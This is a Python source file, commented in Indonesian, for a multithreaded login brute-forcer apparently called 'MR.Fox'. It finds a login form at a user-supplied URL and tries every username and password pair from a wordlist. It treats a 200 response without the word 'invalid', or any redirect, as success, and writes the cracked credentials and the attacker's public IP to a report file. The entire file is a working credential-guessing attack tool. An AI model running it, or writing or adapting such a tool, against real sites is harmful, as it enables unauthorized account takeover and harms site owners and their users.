import requests
import time
import threading
import itertools
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from ascii import print_banner
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------------------- Utility -----------------------

def sanitize_url(url):
    if not url.startswith(('http://', 'https://')):
        print(f"[INFO] Skema tidak ditemukan. Menambahkan 'http://' ke {url}")
        url = 'http://' + url
    return url

def is_valid_url(url):
    try:
        parsed = urlparse(url)
        return parsed.scheme and parsed.netloc
    except:
        return False

def load_wordlist(path):
    try:
        with open(path, 'r', encoding='latin-1') as f:
            lines = [line.strip() for line in f if line.strip()]
            return lines, lines
    except Exception as e:
        print(f"[ERROR] Gagal membaca wordlist: {e}")
        exit(1)

def detect_login_form(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        if not form:
            print("[!] Form login tidak ditemukan.")
            return None
        action = form.get('action') or url
        return url if action.startswith('http') else urlparse(url)._replace(path=action).geturl()
    except:
        return None

# ---------------------- Spinner Loading -----------------------

def show_loading(message, stop_event):
    spinner = itertools.cycle(['|', '/', '-', '\\'])
    while not stop_event.is_set():
        print(f"\r{message} {next(spinner)}", end='', flush=True)
        time.sleep(0.1)
    print("\r" + ' ' * (len(message) + 2), end='\r')  # Clear line

# ---------------------- Brute Logic -----------------------

def try_login(target_url, username, password):
    try:
        payload = {'username': username, 'password': password}
        r = requests.post(target_url, data=payload, timeout=5, allow_redirects=False)

        status = r.status_code
        response_text = r.text.lower()

        if status == 200 and "invalid" not in response_text:
            if len(r.text) > 1000:
                result = f"[✓] LOGIN BERHASIL (200 OK, respon panjang): {username} | {password} | Panjang: {len(r.text)}"
            else:
                result = f"[✓] LOGIN BERHASIL (200 OK): {username} | {password}"
            return (username, password, result)

        elif 300 <= status < 400:
            result = f"[→] LOGIN BERHASIL (DIALIHKAN {status}): {username} | {password} | Redirect: {r.headers.get('Location', 'Unknown')}"
            return (username, password, result)

        else:
            print(f"[x] Gagal login: {username} | {password} | Status: {status}")
            return None

    except requests.RequestException as e:
        print(f"[!] ERROR koneksi untuk {username}:{password} -> {e}")
        return None

# ---------------------- Report & IP Utilities -----------------------

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except Exception:
        return "Unknown"

def write_report_header(report_file, attacker_ip, target_url):
    header = f"""\
MR.Fox Report v0.8
========================
Penyerang  : {attacker_ip}
Target URL : {target_url}
Timestamp  : {time.strftime('%Y-%m-%d %H:%M:%S')}
========================
"""
    report_file.write(header)

# ---------------------- Main -----------------------

def main():
    print_banner()

    target_url = input("Masukkan target URL (contoh: http://testphp.vulnweb.com/login.php): ").strip()
    target_url = sanitize_url(target_url)

    if not is_valid_url(target_url):
        print("[ERROR] URL tidak valid.")
        exit(1)

    form_url = detect_login_form(target_url)
    if not form_url:
        print("[ERROR] Gagal mendeteksi form login.")
        exit(1)

    usernames, passwords = load_wordlist('wordlist.txt')
    results = []

    max_workers = 3  # Bisa disesuaikan
    print(f"[*] Menjalankan brute-force ke: {form_url} dengan {max_workers} thread...\n")

    stop_event = threading.Event()
    loading_thread = threading.Thread(target=show_loading, args=("🔨 Menyerang target...", stop_event))
    loading_thread.start()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for u in usernames:
            for p in passwords:
                futures.append(executor.submit(try_login, form_url, u, p))
                time.sleep(0.01)  # Delay antar request

        for future in as_completed(futures):
            result = future.result()
            if result:
                user, pwd, info = result
                print(info)
                results.append(result)

    stop_event.set()
    loading_thread.join()

    print("\n[+] Hasil brute-force:")
    with open("report.txt", "w") as f:
        attacker_ip = get_public_ip()
        write_report_header(f, attacker_ip, target_url)

        for user, pwd, info in results:
            log = f"Berhasil -> {user}:{pwd} | Info: {info}"
            print(log)
            f.write(log + "\n")

    print("[✓] Laporan disimpan ke report.txt")

if __name__ == "__main__":
    main()
